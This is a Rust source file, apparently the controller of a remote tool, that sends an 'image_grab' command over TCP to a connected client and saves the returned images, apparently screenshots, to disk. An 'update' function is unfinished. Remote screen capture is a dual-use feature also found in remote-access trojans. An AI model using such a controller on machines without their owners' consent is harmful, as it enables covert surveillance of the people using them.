use std::fs::{create_dir_all, File};
use std::io::{stdin, Write};
use std::process::Command;
use anyhow::Result;
use bytes::{Buf, BufMut, BytesMut};
use log::{error, info};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use variable_len_reader::str::{read_string, read_u8_vec, write_string};
use variable_len_reader::variable_len::read_variable_u32;

async fn send(client: &mut TcpStream, data: &[u8]) -> Result<BytesMut> {
    client.write_u32(data.len() as u32).await?;
    client.write_all(data).await?;
    let len = client.read_u32().await? as usize;
    let mut buf = BytesMut::with_capacity(len);
    client.read_buf(&mut buf).await?;
    Ok(buf)
}

pub async fn update(client: &mut TcpStream) -> Result<()>{
    todo!();

    Ok(())
}

pub async fn capture(client: &mut TcpStream) -> Result<()> {
    info!("Sending capture request...");
    let mut buf = BytesMut::new().writer();
    write_string(&mut buf, &"image_grab")?;
    let mut response = send(client, &buf.into_inner()).await?.reader();
    let count = read_variable_u32(&mut response)?;
    if count == 0 {
        let message = read_string(&mut response)?;
        error!("Error from client: {}", message);
        return Ok(());
    }
    info!("Successfully received {} images.", count);
    create_dir_all("images")?;
    for i in 0..count {
        let image = read_u8_vec(&mut response)?;
        let mut file = File::create(format!("images/{}.png", i))?;
        file.write_all(&image)?;
    }
    print!("Press 'ok' to open the images folder:");
    let mut confirm = String::new();
    stdin().read_line(&mut confirm)?;
    if confirm.trim().to_lowercase() == "ok" {
        Command::new("explorer").arg("images").spawn()?;
    }
    Ok(())
}
